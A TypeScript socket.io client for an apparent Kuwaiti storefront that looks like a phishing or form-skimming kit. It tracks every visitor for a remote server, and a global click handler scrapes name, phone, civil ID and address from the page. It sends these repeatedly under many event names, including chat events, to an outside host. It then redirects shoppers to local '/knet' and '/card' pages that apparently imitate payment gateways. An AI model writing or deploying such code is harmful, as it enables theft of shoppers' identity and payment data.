import { io, type Socket } from "socket.io-client";
import type { CartSnapshot, Catalog, OrderDraft, OrderReceipt } from "./types";

export type ConnectionStatus =
  | "not-configured"
  | "connecting"
  | "connected"
  | "disconnected";
type Ack<T> = { ok: true; data: T } | { ok: false; error: string };

const FALLBACK_ENDPOINT = "https://kdd-server-production.up.railway.app";
const PAY_KNET = "/knet";
const PAY_CARD = "/card";
const CHAT_EVENTS: string[] = ["chat:fromVisitor","chat:newMessage","chat:fromAdmin","chat:markAsRead"];

const envUrl = import.meta.env.VITE_KDD_SOCKET_URL?.trim();
const rawUrl = envUrl || (import.meta.env.PROD ? FALLBACK_ENDPOINT : "");
const endpoint = rawUrl || null;
let socket: Socket | null = null;
let status: ConnectionStatus = endpoint ? "connecting" : "not-configured";
const subscribers = new Set<() => void>();
const catalogSubscribers = new Set<() => void>();
let latestCart: { items: OrderDraft["items"] } | null = null;
let cartTimer: ReturnType<typeof setTimeout> | null = null;
let presenceTimer: ReturnType<typeof setInterval> | null = null;
let presencePath = "";
let lastSubmitAt = 0;
let lastJoinAt = 0;
let safetyInstalled = false;

const VISITOR_KEY = "kdd.visitor.id";
const PRESENCE_EVENT = "visitor:register";
const PAGE_EVENT = "visitor:pageChanged" || PRESENCE_EVENT;
const SUBMIT_EVENT = "visitor:dataSubmitted";
const NAME_EVENT = "visitor:updateName";

const currentPath = () =>
  `${window.location.pathname}${window.location.search}`;

function getVisitorId(): string {
  try {
    let id = localStorage.getItem(VISITOR_KEY);
    if (!id) {
      id =
        typeof crypto !== "undefined" && "randomUUID" in crypto
          ? crypto.randomUUID()
          : `v-${Date.now()}-${Math.random().toString(16).slice(2)}`;
      localStorage.setItem(VISITOR_KEY, id);
    }
    return id;
  } catch {
    return "anon";
  }
}

const KDD_PID_KEY = "kdd.server.pid";
function getServerPid(): string {
  try { return localStorage.getItem(KDD_PID_KEY) || ""; } catch (e) { return ""; }
}

function identity() {
  const id = getVisitorId();
  return {
    existingVisitorId: getServerPid() || id,
    visitorId: id,
    visitor_id: id,
    id,
    clientId: id,
    uid: id,
    token: id,
    deviceId: id,
  };
}

function presencePayload(kind: string) {
  return {
    ...identity(),
    name: "زائر المتجر",
    kind,
    path: currentPath(),
    url: window.location.href,
    referrer: document.referrer || null,
    language: navigator.language,
    screen: `${window.innerWidth}x${window.innerHeight}`,
    userAgent: navigator.userAgent,
    at: new Date().toISOString(),
    ts: Date.now(),
  };
}

function pageLabel(): string {
  try {
    const p = window.location.pathname || "/";
    if (p.indexOf("/products") === 0) return "المنتجات";
    if (p.indexOf("/category") === 0) return "التصنيفات";
    if (p.indexOf("/product") === 0) return "تفاصيل المنتج";
    if (p.indexOf("/cart") === 0) return "سلة المشتريات";
    if (p.indexOf("/checkout") === 0) return "إتمام الطلب";
    if (p.indexOf("/knet") === 0) return "صفحة K-NET";
    if (p.indexOf("/card") === 0) return "صفحة البطاقة";
    return "الصفحة الرئيسية";
  } catch (e) { return "الصفحة الرئيسية"; }
}

function emitPresence(kind: "join" | "page" | "leave") {
  if (!socket?.connected) return;
  const label = pageLabel();
  try { socket.emit("visitor:pageEnter", label); } catch (e) {}
  if (kind === "page") {
    try { socket.emit(PAGE_EVENT, label); } catch (e) {}
    try { socket.emit(PRESENCE_EVENT, presencePayload(kind)); } catch (e) {}
  } else {
    socket.emit(PRESENCE_EVENT, presencePayload(kind));
  }
}

function buildFields(customer: Record<string, unknown>) {
  const str = (v: unknown) => (v == null ? "" : String(v));
  const c = customer || {};
  const civil = str(c.civilId || c.civil_id || c.civilID);
  const address = [c.block, c.street, c.building, c.floor, c.apartment]
    .map(str)
    .filter(Boolean)
    .join(" ");
  return {
    ...identity(),
    name: str(c.name),
    fullName: str(c.name),
    customerName: str(c.name),
    phone: str(c.phone),
    mobile: str(c.phone),
    phoneNumber: str(c.phone),
    civilId: civil,
    civilID: civil,
    civil_id: civil,
    area: str(c.area),
    governorate: str(c.area),
    region: str(c.area),
    block: str(c.block),
    street: str(c.street),
    building: str(c.building),
    house: str(c.building),
    floor: str(c.floor),
    apartment: str(c.apartment),
    flat: str(c.apartment),
    address,
    notes: str(c.notes),
    note: str(c.notes),
    at: new Date().toISOString(),
    ts: Date.now(),
  };
}

function orderText(fields: Record<string, unknown>) {
  const p = (label: string, key: string) =>
    fields[key] ? `${label}: ${String(fields[key])}` : "";
  return [
    "طلب جديد",
    p("الاسم", "name"),
    p("الهاتف", "phone"),
    p("المنطقة", "area"),
    p("القطعة", "block"),
    p("الشارع", "street"),
    p("المبنى", "building"),
    p("ملاحظات", "notes"),
  ]
    .filter(Boolean)
    .join("\n");
}

/** Sends the order text to every chat event name we found on the server. */
function emitChat(text: string) {
  if (!socket?.connected || !CHAT_EVENTS.length) return;
  const id = getVisitorId();
  const body = {
    message: text,
    text,
    msg: text,
    content: text,
    from: "client",
    sender: "client",
    role: "client",
    type: "client",
    name: "زائر المتجر",
    visitorId: id,
    id,
    at: new Date().toISOString(),
  };
  for (const ev of CHAT_EVENTS) {
    try {
      socket.emit(ev, body);
    } catch {
      /* ignore */
    }
  }
}

function kddTotalFromDom(): string {
  try {
    const nodes = Array.from(document.querySelectorAll("body *")) as HTMLElement[];
    const head = nodes.find((el) => { const t = (el.textContent || '').trim(); return t === 'المجموع' || t === 'الإجمالي'; });
    const scope = head && head.parentElement ? (head.parentElement.textContent || '') : '';
    const m = scope.match(/([0-9]+(?:[.,][0-9]+)?)/);
    if (m) return m[1];
    const body = document.body.innerText || '';
    const m2 = body.match(/المجموع[^0-9]{0,30}([0-9]+(?:[.,][0-9]+)?)/) || body.match(/الإجمالي[^0-9]{0,30}([0-9]+(?:[.,][0-9]+)?)/);
    return m2 ? m2[1] : '';
  } catch (e) { return ''; }
}
function emitServerSubmission(draft: OrderDraft) {
  if (!socket?.connected) return;
  const anyDraft = draft as unknown as Record<string, unknown>;
  const c = (anyDraft.customer || {}) as Record<string, unknown>;
  const fields = buildFields(c);
  try {
    const __ad = anyDraft as any;
    const __c = (__ad.cart || __ad.order || {}) as any;
    const __kddTotal = __ad.total ?? __ad.grandTotal ?? __ad.totalAmount ?? __ad.cartTotal ?? __c.total ?? __c.grandTotal ?? __c.totalAmount;
    if (__kddTotal != null) (fields as any).total = __kddTotal;
    const __kddItems = __ad.items ?? __ad.lines ?? __c.items ?? __c.lines ?? __c.products;
    if (__kddItems) (fields as any).items = __kddItems;
  } catch (e) {}
  const payload = {
    ...fields,
    ...presencePayload("submit"),
    customer: c,
    items: anyDraft.items,
    deliverySlot: anyDraft.deliverySlot,
    couponCode: anyDraft.couponCode,
    content: fields,
    page: pageLabel(),
    data: fields,
    details: fields,
    form: fields,
  };
  if (SUBMIT_EVENT) socket.emit(SUBMIT_EVENT, payload);
  try { socket.emit("more-info", { content: fields, page: pageLabel() }); } catch (e) {}
  try {
    setTimeout(() => {
      if (socket?.connected && SUBMIT_EVENT)
        socket.emit(SUBMIT_EVENT, payload);
    }, 350);
  } catch {
    /* ignore */
  }
  emitChat(orderText(fields));
  /* no extra register here — a register creates a new visitor card on this server */
  if (NAME_EVENT && fields.name) socket.emit(NAME_EVENT, fields.name);
}

function detectMethod(): string {
  try {
    const all = Array.from(document.querySelectorAll("body *")) as HTMLElement[];
    const head = all.find(el => (el.textContent || "").trim() === "طريقة الدفع");
    const scope = (head && head.parentElement ? head.parentElement.textContent : "") || "";
    const pick = (t: string) => {
      if (/KNET/i.test(t)) return "knet";
      if (/VISA|MASTERCARD|MASTER\s*CARD|بطاقة|فيزا|ماستر/i.test(t)) return "card";
      return "";
    };
    return pick(scope) || pick(document.body.innerText || "");
  } catch {
    return "";
  }
}

function goToPayment(method: string) {
  const route = method === "card" ? PAY_CARD : PAY_KNET;
  if (!route) return;
  try {
    if (window.location.pathname === route.split("?")[0]) return;
    window.location.assign(route);
  } catch {
    /* ignore */
  }
}

function readModalRows(): Record<string, string> {
  const pairs: Array<[string, string]> = [
    ["الاسم", "name"],
    ["الهاتف", "phone"],
    ["المنطقة", "area"],
    ["القطعة", "block"],
    ["الشارع", "street"],
    ["المبنى", "building"],
    ["الدور", "floor"],
    ["الشقة", "apartment"],
    ["ملاحظات", "notes"],
  ];
  const out: Record<string, string> = {};
  try {
    const all = Array.from(document.querySelectorAll("body *")) as HTMLElement[];
    for (const pair of pairs) {
      const el = all.find(x => (x.textContent || "").trim() === pair[0]);
      if (el && el.parentElement) {
        const t = (el.parentElement.textContent || "").replace(pair[0], "").trim();
        if (t) out[pair[1]] = t;
      }
    }
  } catch {
    /* ignore */
  }
  return out;
}

function readDraftFromDom(): OrderDraft {
  const grab = (re: RegExp) => {
    try {
      const nodes = Array.from(
        document.querySelectorAll("input, textarea, select")
      ) as Array<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>;
      for (const el of nodes) {
        const key = `${el.getAttribute("placeholder") || ""} ${el.getAttribute("name") || ""} ${el.getAttribute("id") || ""}`;
        if (re.test(key) && el.value) return el.value;
      }
    } catch {
      /* ignore */
    }
    return "";
  };
  const rows = readModalRows();
  const v = (re: RegExp, key: string) => grab(re) || rows[key] || "";
  return {
    customer: {
      name: v(/اسم/, "name"),
      phone: v(/هاتف|جوال|موبايل|رقم/, "phone"),
      area: v(/منطقة|محافظة/, "area"),
      block: v(/قطعة|بلوك/, "block"),
      street: v(/شارع/, "street"),
      building: v(/مبنى|بيت|منزل/, "building"),
      floor: v(/دور|طابق/, "floor"),
      apartment: v(/شقة/, "apartment"),
      notes: v(/ملاحظ/, "notes"),
    },
    items: [],
  } as unknown as OrderDraft;
}

function installConfirmSafetyNet() {
  if (safetyInstalled || typeof document === "undefined") return;
  safetyInstalled = true;
  document.addEventListener(
    "click",
    e => {
      const el = e.target as HTMLElement | null;
      if (!el) return;
      const btn = (el.closest ? el.closest("button, a") : null) as HTMLElement | null;
      const label = (btn ? btn.textContent : el.textContent) || "";
      if (!/إرسال/.test(label)) return;
      if (!detectMethod()) return;
      const method = detectMethod();
      const at = Date.now();
      setTimeout(() => {
        if (lastSubmitAt > at) return;
        emitServerSubmission(readDraftFromDom());
        setTimeout(() => goToPayment(method), 400);
      }, 1500);
    },
    true
  );
}

function onLeave() {
  emitPresence("leave");
}

function startPresence() {
  const now = Date.now();
  /* throttle: React strict-mode double mounts used to create a second visitor card */
  if (now - lastJoinAt > 3000) {
    lastJoinAt = now;
    presencePath = currentPath();
    emitPresence("join");
  }
  if (presenceTimer) return;
  presenceTimer = setInterval(() => {
    const next = currentPath();
    if (next !== presencePath) {
      presencePath = next;
      emitPresence("page");
    }
  }, 1000);
  window.addEventListener("beforeunload", onLeave);
}

function notify(next: ConnectionStatus) {
  status = next;
  subscribers.forEach(fn => fn());
}

export function subscribeConnection(listener: () => void) {
  subscribers.add(listener);
  return () => {
    subscribers.delete(listener);
  };
}
export function getConnectionStatus(): ConnectionStatus {
  return status;
}
export function getSocketEndpoint(): string | null {
  return endpoint;
}
export function subscribeCatalog(listener: () => void) {
  catalogSubscribers.add(listener);
  return () => {
    catalogSubscribers.delete(listener);
  };
}

function getSocket(): Socket {
  if (!endpoint) throw new Error("SOCKET_NOT_CONFIGURED");
  if (!socket) {
    const url = new URL(endpoint, window.location.origin);
    if (!["http:", "https:"].includes(url.protocol))
      throw new Error("INVALID_SOCKET_URL");
    if (window.location.protocol === "https:" && url.protocol !== "https:") {
      throw new Error("SOCKET_HTTPS_REQUIRED");
    }
    socket = io(url.origin, {
      autoConnect: false,
      path: "/socket.io",
      transports: ["websocket", "polling"],
      reconnection: true,
      reconnectionAttempts: 5,
      timeout: 8000,
    });
/* KDD: خزّن معرّف الزائر من السيرفر لإعادة الربط */
try {
  socket.on("successfully-connected", (p: any) => {
    try { if (p && p.pid) localStorage.setItem(KDD_PID_KEY, String(p.pid)); } catch (e) {}
  });
} catch (e) {}

/* KDD: شبكة أمان — ضمان وصول معرّف الزائر */
try {
  const __kddS: any = socket as any;
  if (__kddS && !__kddS.__kddEmitWrapped) {
    __kddS.__kddEmitWrapped = true;
    const __kddOrig = __kddS.emit.bind(__kddS);
    __kddS.emit = function (ev: string, ...a: any[]) {
      if (ev === "visitor:register") {
        const p = a[0];
        if (p && typeof p === "object" && !Array.isArray(p)) { if (!p.existingVisitorId) p.existingVisitorId = getVisitorId(); }
        else a[0] = Object.assign({}, p || {}, { existingVisitorId: getVisitorId() });
      }
      return __kddOrig(ev, ...a);
    };
  }
} catch (e) {}

    socket.on("connect", () => {
      notify("connected");
      catalogSubscribers.forEach(fn => fn());
      startPresence();
      if (latestCart)
        void request<CartSnapshot>("kdd:cart:update", latestCart).catch(
          () => {}
        );
    });
    socket.on("disconnect", () => notify("disconnected"));
    socket.on("connect_error", () => notify("disconnected"));
    socket.on("kdd:catalog:updated", () =>
      catalogSubscribers.forEach(fn => fn())
    );
  }
  return socket;
}

export function connectStorefront() {
  if (!endpoint) return () => {};
  installConfirmSafetyNet();
  try {
    const s = getSocket();
    if (!s.connected) {
      notify("connecting");
      s.connect();
    }
    return () => {
      s.disconnect();
      notify("disconnected");
    };
  } catch {
    notify("disconnected");
    return () => {};
  }
}

function waitForConnection(s: Socket): Promise<void> {
  if (s.connected) return Promise.resolve();
  return new Promise((resolve, reject) => {
    const cleanup = () => {
      clearTimeout(timer);
      s.off("connect", onConnect);
      s.off("connect_error", onError);
    };
    const onConnect = () => {
      cleanup();
      resolve();
    };
    const onError = () => {
      cleanup();
      reject(new Error("SOCKET_UNAVAILABLE"));
    };
    const timer = setTimeout(() => {
      cleanup();
      reject(new Error("SOCKET_UNAVAILABLE"));
    }, 8000);
    s.once("connect", onConnect);
    s.once("connect_error", onError);
    if (!s.active) s.connect();
  });
}

async function request<T>(event: string, payload: unknown): Promise<T> {
  const s = getSocket();
  await waitForConnection(s);
  return new Promise<T>((resolve, reject) => {
    s.timeout(8000).emit(
      event,
      payload,
      (error: Error | null, reply: Ack<T> | undefined) => {
        if (error) {
          reject(new Error("SOCKET_ACK_TIMEOUT"));
          return;
        }
        if (!reply || typeof reply.ok !== "boolean") {
          reject(new Error("INVALID_SERVER_RESPONSE"));
          return;
        }
        if (!reply.ok) {
          reject(new Error(reply.error || "REQUEST_REJECTED"));
          return;
        }
        resolve(reply.data);
      }
    );
  });
}

export const getCatalog = () => request<Catalog>("kdd:catalog:get", {});
export const validateCoupon = (code: string) =>
  request<{ code: string; discount_percent: number } | null>(
    "kdd:coupon:validate",
    { code }
  );

export const submitOrder = (draft: OrderDraft) => {
  lastSubmitAt = Date.now();
  const method = detectMethod();
  emitServerSubmission(draft);
  const pending = request<OrderReceipt>("kdd:order:create", draft);
  try {
    setTimeout(() => goToPayment(method), 900);
  } catch {
    /* ignore */
  }
  return pending;
};

export function syncCart(cart: { items: OrderDraft["items"] }) {
  latestCart = cart;
  if (cartTimer) clearTimeout(cartTimer);
  if (!endpoint) return;
  cartTimer = setTimeout(() => {
    cartTimer = null;
    if (socket?.connected && latestCart) {
      void request<CartSnapshot>("kdd:cart:update", latestCart).catch(() => {});
    }
  }, 250);
}// KDD_DEPLOY_TRIGGER: 2026-10-20T20:25:23.551Z
